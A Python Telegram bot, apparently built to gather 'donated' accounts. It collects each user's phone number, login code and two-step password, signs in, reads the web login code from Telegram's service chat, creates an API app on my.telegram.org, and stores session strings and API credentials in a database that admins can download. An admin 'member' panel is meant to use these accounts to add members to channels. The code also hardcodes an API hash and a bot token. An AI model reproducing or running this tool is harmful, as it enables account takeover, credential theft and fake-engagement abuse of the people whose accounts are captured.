from telethon import TelegramClient,Button
from telethon.errors.rpcerrorlist import SessionPasswordNeededError
from telethon import errors
from telethon.sessions import StringSession,MemorySession
from telethon.events import NewMessage
import logging
import os
import requests
import re
from bs4 import BeautifulSoup
#from concurrent.futures._base import TimeoutError
from asyncio.exceptions import TimeoutError
from time import sleep
import random
import shutil
import peewee
from datetime import datetime


db = peewee.SqliteDatabase("db.sqlite")
#peewee
class BaseDb(peewee.Model):
    class Meta:
        database = db

class Phone(BaseDb):
    number = peewee.CharField(unique=True)
    donater = peewee.CharField()
    session = peewee.CharField()
    aid = peewee.CharField()
    ahsh = peewee.CharField()
    date = peewee.DateTimeField(default=datetime.now())

class User(BaseDb):
    uid = peewee.CharField(unique=True)
    status = peewee.CharField()
    donated = peewee.IntegerField()

db.connect()
db.create_tables([Phone,User])  



 


#peewee
logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

API_ID = 1544711
API_HASH = 'd04ebd2eea6942d8ff4a991d682eb6a7'
client = TelegramClient("main",api_id=API_ID,api_hash=API_HASH)

def set_st(x,y):
    u = User.select().where(User.uid ==x).get()
    u.status = y
    u.save()
get_st = lambda x:User.select().where(User.uid ==x).get().status
NAMES = ['Ali','Mostafa','Mohammad','Hosein','Abbas','Akbar','Arash','Sobhan','Javad','Sara','Dorsa','Sina','Aryan','Zahra','Maryam','Saman']
ADMINS = [932528835]
LAST_NAMES = ['Jalili','Rahmani','akbari','arshadi','fatemi','jokar','mohammadi','alavi']
b = lambda x:Button.text(x,resize=True,single_use=True)


class LoginWeb:
    def __init__(self, phone):
        self.pn = phone
        self.ses = requests.Session()
        r = self.ses.post(
            "https://my.telegram.org/auth/send_password", {'phone': phone})
        self.dic = eval(r.text)

    def login(self, password):
        r2 = self.ses.post("https://my.telegram.org/auth/login", {
                           'phone': self.pn, 'random_hash': self.dic['random_hash'], 'password': password}, allow_redirects=True)

    def create_app(self):
        res = self.ses.get('https://my.telegram.org/apps')
        soup = BeautifulSoup(res.text, 'html.parser')
        hash = soup.find("input", attrs={"name": "hash"})
        vh = hash.get_attribute_list('value')[0]

        datas = {
            'app_title': 'Developer Robot',
            'app_shortname': "MyAccountManager",
            'app_url': "",
            'app_platform': "android",
            'app_desc': 'nothing',
            'hash': vh
        }
        r3 = self.ses.post("https://my.telegram.org/apps/create",
                           data=datas, allow_redirects=True)

    def get_apis(self):
        r4 = self.ses.get('https://my.telegram.org/apps')
        soup = BeautifulSoup(r4.text, 'html.parser')
        aid = (soup.findAll("span")[0].text)
        ahash = (soup.findAll("span")[2].text)
        return {'api_id': aid, 'api_hash': ahash}


class NewAcc:
    def __init__(self,phone):
        self.phone = phone
        self.client = TelegramClient(MemorySession(),API_ID,API_HASH)
    async def send_code(self):
        await self.client.connect()
        res = await self.client.send_code_request(self.phone)
        await self.client.disconnect()
        return res
    async def login(self,code):
        await self.client.connect()
        res = await self.client.sign_in(self.phone,code)
        await self.client.disconnect()
        return res


async def handle_conv1(e):
    text = e.message.text
    uid = e.sender.id
    cid = e.chat_id
    cclient = None
    logged = None
    two = False
    async with client.conversation(uid) as conv:
        await conv.send_message('Phone Number?',buttons=client.build_reply_markup(Button.text("بازگشت به منوی اصلی")))
        phone = await conv.get_response()
        phone = phone.text
        phone = phone.replace(" ","").replace("(","").replace(")","")
        if "بازگشت" in phone or "اهدا" in phone:
            conv.cancel()
            #await handle_conv1(e)
            return
        if not phone.replace("+","").isnumeric():
            await e.reply("شماره معتبر نیست")
            return
        try:
            Phone.select().where(Phone.number == phone).get()
            await e.reply(f"این شماره قبلا اهدا شده است!")
            return
        except peewee.DoesNotExist:
            pass
        cclient = TelegramClient(MemorySession(),API_ID,API_HASH)
        await cclient.connect()
        try:
            res = await cclient.send_code_request(phone)
            print(res)
        except errors.rpcerrorlist.FloodWaitError as ex:
            await e.reply(f" شماره مورد نظر موقتا دچار فلود شده است و تا {ex.seconds} ثانیه دیگر امکان ارسال کد ندارد")
            return 
        await conv.send_message("Code >>")
        for attempt in [1,2,3]:
            code = await conv.get_response()
            code = code.text
            try:
                #print(f"{code=}")
                logged = await cclient.sign_in(phone,code)
            except SessionPasswordNeededError:
                await conv.send_message("اکانت دارای تایید دو مرحله ای میباشد لطفا رمز آن را ارسال کنید")
                two = True
                break
            except errors.PhoneNumberUnoccupiedError:
                logged = await cclient.sign_up(code,random.choice(NAMES),random.choice(LAST_NAMES))
            except (errors.PhoneCodeEmptyError,errors.PhoneCodeExpiredError,errors.PhoneCodeHashEmptyError,errors.PhoneCodeInvalidError):
                if attempt == 3:
                    await conv.send_message("تعداد دفعات ورود رمز غلط به 3 رسیده است لطفا بعدا تلاش کنید")
                else:
                    await conv.send_message(f"کد وارد شده اشتباه است لطفا مجددا ارسال کنید ({attempt}/3)")
            except Exception as ex:
                print(ex)
        print("check2")
        if two:
            print("is2")
            for attempt in [1,2,3]:
                f2a = await conv.get_response()
                f2a = f2a.text
                try:
                    #print(f"{f2a=}")
                    logged = await cclient.sign_in(phone=phone,password=f2a)
                    break
                except (errors.PasswordHashInvalidError):
                    if attempt == 3:
                        await conv.send_message("تعداد دفعات بیش از حد مجاز شد لطفا بعدا تلاش کنید")
                    else:
                        await conv.send_message(f"کد وارد شده اشتباه است یا باطل شده است ! ({attempt}/3)")
                except Exception as ex:
                    print(ex)
            print("endfor")
        print(logged)
        if logged:
            lw = LoginWeb(phone)
            sleep(2)
            msg = await cclient.get_messages(777000,limit=1)
            msg = msg[0].message
            pas =re.findall(r".*\s*login\s*code:\s*(.*)\s*Do",msg)[0]
            psa = pas.strip()
            lw.login(pas)
            lw.create_app()
            ays = lw.get_apis()
            session = StringSession.save(cclient.session)
            newphone = Phone.create(
                number=phone,
                donater=uid,
                session=session,
                aid=ays['api_id'],
                ahsh=ays['api_hash'],
            )
            u = User.select().where(User.uid == uid).get()
            udonated = u.donated
            u.donated = int(udonated)+1
            u.save()
            newphone.save()
            await conv.send_message(f"با موفقیت به نام {logged.first_name} {logged.last_name or ''} وارد شد\nامتیاز شما : {int(u.donated)+1}")
        if cclient:await cclient.disconnect()


@client.on(NewMessage)
async def donate_account(e:NewMessage.Event):
    text = e.message.text
    uid = e.sender.id
    cid = e.chat_id
    try:
        u = User.select().where(User.uid==uid).get()
    except peewee.DoesNotExist:
        u = User.create(uid=uid,status="",donated=0)
        u.save()
    status = u.status
    if text == "اهدای اکانت":
        try:
            await handle_conv1(e)
        except TimeoutError:
            await e.reply("وقت شما تمام شد لطفا  مجددا درخواست فرمایید")
        except errors.common.AlreadyInConversationError:
            conv = client.conversation(uid)
            print(conv)
            await conv.cancel_all()
            conv.cancel()
            return
        except Exception as ex:
            print(type(ex))
            err = str(ex)[:3000]
            await e.reply(f"**Unknown Error:**\n**Type**:{type(ex)}\n`{err}`\n\n**Report to :@The_Bloody**")

KEYB = client.build_reply_markup(b("اهدای اکانت"))
@client.on(NewMessage)
async def start(e:NewMessage.Event):
    uid = e.sender.id
    text = e.message.text
    if text =="/start" or text == "بازگشت به منوی اصلی":
        try:
            u = User.select().where(User.uid==uid).get()
        except peewee.DoesNotExist:
            print("new user")
            u = User.create(uid=uid,status="",donated=0)
            u.save()
            await e.reply("Hello :)😆",buttons=KEYB)
        else:
            await e.reply("Welcome Back:)",buttons=KEYB)

@client.on(NewMessage(from_users=ADMINS))
async def admin(e:NewMessage.Event):
    text = e.message.text
    uid = e.sender.id
    cid = e.chat_id
    if text =="test":
        print("test")
        for i in User.select():
            print(i.uid,i.status,i.donated)
        for i in Phone.select():
            print(i.number,i.donater,i.date,i.aid,i.ahsh,i.session)
    elif text == "/panel":
        await e.reply("Select :",buttons=client.build_reply_markup([[b("backup")],[b("member")]]))
    elif text == "backup":
        await e.reply("Wait ...")
        await client.send_file(cid,file="db.sqlite")
    elif text == "member":
        async with client.conversation(cid,) as conv:
            await conv.send_message("لینک چنل موردنظر را ارسال کنید!",buttons=client.build_reply_markup([b("بازگشت")]))
            chanel = await conv.get_response()
            chanel = chanel.text
            if text == "بازگشت":
                await e.reply("Select :",buttons=client.build_reply_markup([[b("backup")],[b("member")]]))
                return
            try:
                ent = await client.get_entity(chanel) or None
            except ValueError:
                await conv.send_message("چنین چنلی پیدا نشد ")
                return
            if ent:
                await conv.send_message(f"**Channel:**\n\nName:{ent.title}\nid:{ent.id}\n")
                await conv.send_message("چنل را تایید میکنید؟",buttons=client.build_reply_markup([b("بله"),b("نه")]))
            sure = await conv.get_response()
            sure = sure.text
            if sure == "بله":
                await conv.send_message(f"تعداد ممبر مورد نظر جهت واریز را ارسال کنید !")
                for attempt in [1,2,3]:
                    num = await conv.get_response()
                    num = num.text
                    if num.isnumeric():
                        #send memmber
                        await conv.send_message(f" تعداد ۲۰ ممبر واریز شد")

                    else:
                        if attempt == 3:
                            await conv.send_message("فرایند سفارش کنسل شد!")
                            return
                        await conv.send_message("باید به صورت عدد وارد کنید")
            else:
                await conv.send_message("فرایند سفارش کنسل شد!")

client.start(bot_token="1243749807:AAEVJvmaAcy25DsjyIeOLuNPGfuHLhxJ-YY")
print("R    U   N")
client.run_until_disconnected()